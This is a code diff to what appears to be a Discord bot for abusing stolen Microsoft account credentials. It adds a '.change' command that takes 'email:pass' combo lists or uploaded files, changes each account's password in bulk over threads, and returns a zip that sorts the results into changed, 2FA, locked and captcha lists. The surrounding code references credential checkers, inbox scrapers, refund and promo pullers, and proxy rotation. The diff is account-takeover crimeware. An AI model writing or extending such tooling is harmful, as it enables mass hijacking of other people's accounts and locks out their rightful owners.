@@ -16,6 +16,7 @@ const { pullPromos } = require("./utils/promo-puller");
 const { checkRefundAccounts } = require("./utils/microsoft-refund");
 const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
 const { runCountrySort } = require("./utils/microsoft-countrysort");
+const { changePasswords } = require("./utils/microsoft-changer");
 const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats } = require("./utils/proxy-manager");
 const blacklist = require("./utils/blacklist");
 const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
@@ -37,6 +38,8 @@ const {
   inboxAioResultsEmbed,
   countrySortProgressEmbed,
   countrySortResultsEmbed,
+  changerProgressEmbed,
+  changerFinalEmbed,
   rewardsResultsEmbed,
   refundProgressEmbed,
   refundResultsEmbed,
@@ -92,7 +95,7 @@ function isOwner(userId) {
 // ── Channel enforcement ──────────────────────────────────────
 
 const PULLER_CHECKER_CMDS = new Set(["pull", "promopuller", "check", "checker", "claim"]);
-const INBOX_NORMAL_CMDS = new Set(["inboxaio", "countrysort", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio"]);
+const INBOX_NORMAL_CMDS = new Set(["inboxaio", "countrysort", "rewards", "help", "stats", "wlidset", "refund", "netflix", "steam", "xboxchk", "aio", "change"]);
 
 function getRequiredChannel(cmd) {
   if (PULLER_CHECKER_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_PULLER;
@@ -980,6 +983,116 @@ async function handleCountrySort(respond, userId, accountsRaw, accountsFile, thr
   }
 }
 
+// ── Password Changer ────────────────────────────────────────
+
+async function handleChange(respond, userId, newPassword, accountsRaw, accountsFile, threads = 3, dmUser = null) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
+
+  if (!newPassword || newPassword.length < 8) {
+    return respond({ embeds: [errorEmbed("New password must be at least 8 characters. Usage: `.change <newpass> <accounts>` or attach .txt")] });
+  }
+
+  const acquire = limiter.acquire(userId, "change");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
+
+    const startTime = Date.now();
+    const msg = await respond({
+      embeds: [changerProgressEmbed({ completed: 0, total: accounts.length, changed: 0, failed: 0, elapsed: 0, username: dmUser?.username })],
+      components: [stopButton(userId)],
+      fetchReply: true,
+    });
+
+    let lastUpdate = Date.now();
+    let changedCount = 0, failedCount = 0;
+
+    const results = await changePasswords(
+      accounts,
+      newPassword,
+      threads,
+      (done, total, r) => {
+        if (r) {
+          if (r.success) changedCount++; else failedCount++;
+        }
+        const now = Date.now();
+        if (now - lastUpdate > 2500) {
+          lastUpdate = now;
+          updateProgress(msg, changerProgressEmbed({
+            completed: done, total, changed: changedCount, failed: failedCount,
+            elapsed: Date.now() - startTime,
+            latestAccount: r?.email || "",
+            latestStatus: r?.success ? "changed" : (r?.status || r?.error || "failed"),
+            username: dmUser?.username,
+          }), userId);
+        }
+      },
+      ac.signal
+    );
+
+    const stopped = ac.signal.aborted;
+    const elapsed = Date.now() - startTime;
+
+    const changed = results.filter((r) => r.success);
+    const failed  = results.filter((r) => !r.success);
+    const twoFA   = results.filter((r) => !r.success && /2fa|two.?factor|verification/i.test(r.error || r.status || ""));
+    const locked  = results.filter((r) => !r.success && /locked/i.test(r.error || r.status || ""));
+    const captcha = results.filter((r) => !r.success && /captcha/i.test(r.error || r.status || ""));
+
+    // Rebuild old-pass map for failed lines
+    const oldPassMap = new Map();
+    for (const a of accounts) {
+      const i = a.indexOf(":");
+      if (i !== -1) oldPassMap.set(a.substring(0, i), a.substring(i + 1));
+    }
+
+    const zipEntries = [];
+    if (changed.length > 0) {
+      zipEntries.push({ name: "changed.txt", content: changed.map((r) => `${r.email}:${newPassword}`).join("\n") });
+    }
+    if (failed.length > 0) {
+      zipEntries.push({ name: "failed.txt", content: failed.map((r) => `${r.email}:${oldPassMap.get(r.email) || ""} | ${r.error || r.status || "failed"}`).join("\n") });
+    }
+    if (twoFA.length > 0)   zipEntries.push({ name: "2fa.txt",     content: twoFA.map((r)   => `${r.email}:${oldPassMap.get(r.email) || ""}`).join("\n") });
+    if (locked.length > 0)  zipEntries.push({ name: "locked.txt",  content: locked.map((r)  => `${r.email}:${oldPassMap.get(r.email) || ""}`).join("\n") });
+    if (captcha.length > 0) zipEntries.push({ name: "captcha.txt", content: captcha.map((r) => `${r.email}:${oldPassMap.get(r.email) || ""}`).join("\n") });
+
+    const embed = changerFinalEmbed({
+      total: results.length, changed: changed.length, failed: failed.length,
+      twoFA: twoFA.length, locked: locked.length, captcha: captcha.length,
+      elapsed, username: dmUser?.username,
+    });
+    if (stopped) embed.setDescription((embed.data.description || "") + "\n\n*Stopped -- partial results*");
+
+    const { buildZipBuffer } = require("./utils/zip-builder");
+    const zipBuffer = buildZipBuffer(zipEntries);
+    const zipFile = new AttachmentBuilder(zipBuffer, { name: "changer_results.zip" });
+
+    if (dmUser) {
+      try {
+        await dmUser.send({ embeds: [embed], files: [zipFile] });
+        await msg.edit({ embeds: [infoEmbed("Password Changer Complete", `Changed ${changed.length}/${results.length} accounts. Results sent to your DMs.`)], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed], files: [zipFile], components: [] });
+    }
+
+    statsManager.record(userId, "change", changed.length);
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
+
 // ── Admin Panel ─────────────────────────────────────────────
 
 async function handleAdminPanel(respond, callerId) {
@@ -1225,6 +1338,14 @@ client.on("interactionCreate", async (interaction) => {
         interaction.options.getAttachment("accounts_file"),
         interaction.options.getInteger("threads") || 3,
         user);
+    } else if (commandName === "change") {
+      await interaction.deferReply();
+      await handleChange(respond, user.id,
+        interaction.options.getString("newpass"),
+        interaction.options.getString("accounts"),
+        interaction.options.getAttachment("accounts_file"),
+        interaction.options.getInteger("threads") || 3,
+        user);
     } else if (commandName === "wlidset") {
       await handleWlidSet(respond, user.id,
         interaction.options.getString("wlids"),
@@ -1409,6 +1530,13 @@ client.on("messageCreate", async (message) => {
       const attachment = message.attachments.first();
       if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.countrysort <accounts>` or attach .txt — sorts by country, top 20 shown.")] });
       await handleCountrySort(respond, message.author.id, accountsRaw, attachment, 3, message.author);
+    } else if (cmd === "change") {
+      const attachment = message.attachments.first();
+      if (args.length < 1) return respond({ embeds: [infoEmbed("Usage", "`.change <newpass> <email:pass>` or `.change <newpass>` + attach .txt")] });
+      const newPassword = args[0];
+      const accountsRaw = args.slice(1).join(" ");
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.change <newpass> <email:pass>` or attach .txt with combos.")] });
+      await handleChange(respond, message.author.id, newPassword, accountsRaw, attachment, 3, message.author);
     } else if (cmd === "wlidset") {
       const wlidsRaw = args.join(" ");
       const attachment = message.attachments.first();
